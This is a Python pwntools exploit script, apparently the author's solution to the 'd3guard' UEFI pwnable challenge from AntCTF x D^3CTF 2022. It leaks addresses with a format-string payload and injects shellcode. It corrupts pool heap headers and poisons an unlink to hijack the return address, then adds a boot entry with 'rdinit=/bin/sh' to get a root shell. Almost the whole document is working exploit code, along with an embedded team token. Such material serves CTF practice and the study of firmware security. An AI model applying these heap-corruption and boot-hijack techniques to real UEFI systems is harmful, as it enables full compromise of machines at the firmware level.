#!/usr/bin/python3
# ************************************************ #
# AntCTF x D^3CTF 2022                             #
# Type: Pwnable                                    #
# Chall: d3guard                                   #
# Author: Eqqie (https://github.com/yikesoftware/) #
# ************************************************ #
from pwn import *
import os
import sys
import random

context.arch = "amd64"
remote_addr = ("1-lb-pwn-challenge-cluster.d3ctf.io", 32659)
test_token = b"Sdtwx24ticC608cDjeeK35700MgHXh5D"

if len(sys.argv) != 2:
    print("python3 exp.py <remote-socat|remote-debug|remote-nodebug|local-socat|local-nodebug|local-debug>")
    sys.exit(0)
mode = sys.argv[1]
# remote
if mode == "remote-socat":
    os.system("clear")
    os.system(
        f"socat $(tty),echo=0,escape=0x03 SYSTEM:\"python3 {__file__} remote-nodebug\" 2>&1")
    sys.exit(0)
elif mode == "remote-debug":
    context.log_level = "debug"
    do_proof = True
    p = remote(remote_addr[0], remote_addr[1])
elif mode == "remote-nodebug":
    do_proof = True
    p = remote(remote_addr[0], remote_addr[1])
# lcoal
elif mode == "local-socat":
    os.system("cp OVMF.fd.bak OVMF.fd")
    os.system(
        f"socat $(tty),echo=0,escape=0x03 SYSTEM:\"python3 {__file__} local-nodebug\" 2>&1")
elif mode == "local-debug":
    do_proof = False
    os.system("cp OVMF.fd.bak OVMF.fd")
    p = process([
        "qemu-system-x86_64",
        "-s",
        "-m", f"{256+random.randint(0, 512)}",
        "-drive", "if=pflash,format=raw,file=OVMF.fd",
        "-drive", "file=fat:rw:contents,format=raw",
        "-net", "none",
        "-nographic"
    ])
elif mode == "local-nodebug":
    do_proof = False
    os.system("cp OVMF.fd.bak OVMF.fd")
    p = process([
        "qemu-system-x86_64",
        "-m", f"{256+random.randint(0, 512)}",
        "-drive", "if=pflash,format=raw,file=OVMF.fd",
        "-drive", "file=fat:rw:contents,format=raw",
        "-net", "none",
        "-monitor", "/dev/null",
        "-nographic"
    ])


def new_visitor(_id: int, name, desc):
    p.sendafter(b">> ", b"1\r")
    p.sendafter(b"ID: ", str(_id).encode()+b"\r")
    p.sendafter(b"Name: ", name+b"\r")
    p.sendafter(b"Desc: ", desc+b"\r")


def edit(target, content):
    p.sendafter(b">> ", b"2\r")
    if target == 1 or target == "name":
        p.sendafter(b">> ", b"1\r")
        p.sendafter(b"Name: ", content+b"\r")
    if target == 2 or target == "desc":
        p.sendafter(b">> ", b"2\r")
        p.sendafter(b"Desc: ", content+b"\r")


def clear():
    p.sendafter(b">> ", b"3\r")


key_map = {
    "up":    b"\x1b[A",
    "down":  b"\x1b[B",
    "left":  b"\x1b[D",
    "right": b"\x1b[C",
    "esc":   b"\x1b^[",
    "enter": b"\r",
    "tab":   b"\t"
}


def send_key(_key: str, times: int = 1):
    for _ in range(times):
        p.send(key_map[_key])


def exp():
    # team token
    if do_proof:
        print("test_token:", test_token)
        p.sendlineafter(b"Input your team token:", test_token)

    # into 'UiAPP'
    p.recv(1)
    p.send(b'\x1b[24~'*20)

    # leak image_addr & stack_addr
    p.sendafter(b"Visitor): ", b"1\r")
    p.sendafter(b"Username: ",
                b"|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p\r")
    p.recvuntil(b"User [")
    for _ in range(5):
        p.recvuntil(b"|")
    stack_leak = int(p.recvuntil(b"|", drop=True).decode(), 16)
    for _ in range(11):
        p.recvuntil(b"|")
    image_leak = int(p.recvuntil(b"|", drop=True).decode(), 16)
    app_base = image_leak-0x173f5

    # write null-off shellcode
    p.sendafter(b"Visitor): ", b"1\r")
    p.sendafter(b"Username: ", b"Admin\r")
    shellcode = asm('''
    jmp JUMP;
    .byte 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90;
    .byte 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90;
    JUMP:
        mov rax, r15;
        mov rbx, 0x1461e11;
        shr rbx, 8;
        sub rax, rbx;
        jmp rax;
    ''')
    p.sendafter(b"Pass key: ", shellcode+b"\r")

    # into visitor system
    p.sendafter(b"Visitor): ", b"2\r")

    # new
    new_visitor(1, b"eqqie", b"a")
    clear()
    edit("name", b"eqqie")
    edit("desc", b"aaa")

    # modify POOL_HEAD.Type
    # part3
    part3 = b""
    part3 += p64(0x40)[0:7]  # POOL_HEAD.Size
    edit("desc", b"\xaf"*(0x7f-len(part3))+part3)
    # part2
    part2 = b""
    part2 += b"\xaf"*0x20  # pad
    part2 += p32(0x30646870)  # POOL_HEAD.Signature
    part2 += b"\xaf\xaf\xaf\xaf"  # POOL_HEAD.Reserved
    part2 += p8(10)  # POOL_HEAD.Type (EfiACPIMemoryNVS)
    for i in range(6, -1, -1):
        tmp = part2+b"\xaf"*i
        edit("desc", b"\xaf"*(0x7f-len(part3)-len(part2)-7)+tmp)
    # part1
    part1 = b""
    part1 = part1.ljust(0x38, b"\xaf")
    part1 += b"ptal"  # POOL_TAIL.Signature
    part1 += b"\xaf"*4  # POOL_TAIL.Reserved
    part1 += p8(0x60)  # POOL_TAIL.Size
    for i in range(6, -1, -1):
        tmp = part1+b"\xaf"*i
        edit("desc", b"\xaf"*(0x7f-len(part3)-len(part2)-7-len(part1)-7)+tmp)
    # Put 'name' into other free list
    clear()

    # poison unlink
    edit("desc", b"aaa")
    edit("name", b"eqqie")
    clear()
    edit("desc", b"aaa")
    edit("name", b"eqqie")
    # calc addr
    ret_addr = stack_leak-0x104ba
    stack_shellcode = ret_addr-0x49
    # part4(BK)
    part4 = p32(ret_addr)
    edit("desc", b"\xaf"*0x78+part4)
    # part3(FD)
    part3 = p32(stack_shellcode)
    for i in range(3, -1, -1):
        tmp = part3+b"\xaf"*i
        edit("desc", b"\xaf"*0x70+tmp)
    # part2
    part2 = b"pfr0"
    for i in range(3, -1, -1):
        tmp = part2+b"\xaf"*i
        edit("desc", b"\xaf"*0x68+tmp)
    # part1
    part1 = b"\xaf"*0x38
    part1 += b"ptal"+b"\xaf"*4
    part1 += p8(0x60)
    for i in range(6, -1, -1):
        tmp = part1+b"\xaf"*i
        edit("desc", tmp)

    # return to UiAPP
    p.sendafter(b">> ", b"4\r")
    print("app_base:", hex(app_base))
    print("ret_addr:", hex(ret_addr))
    print("stack_shellcode:", hex(stack_shellcode))

    p.send(b"\r")

    # Add new boot option
    p.recvuntil(b"Standard PC")
    send_key("down", 3)
    send_key("enter")
    send_key("enter")
    send_key("down")
    send_key("enter")
    send_key("enter")
    send_key("down", 3)
    send_key("enter")
    p.send(b"\rrootshell\r")
    send_key("down")
    p.send(b"\rconsole=ttyS0 initrd=rootfs.img rdinit=/bin/sh quiet\r")
    send_key("down")
    send_key("enter")
    send_key("up")
    send_key("enter")
    send_key("esc")
    send_key("enter")
    send_key("down", 3)
    send_key("enter")

    # root shell
    # p.sendlineafter(b"/ #", b"cat /flag")
    p.interactive()


if __name__ == "__main__":
    exp()
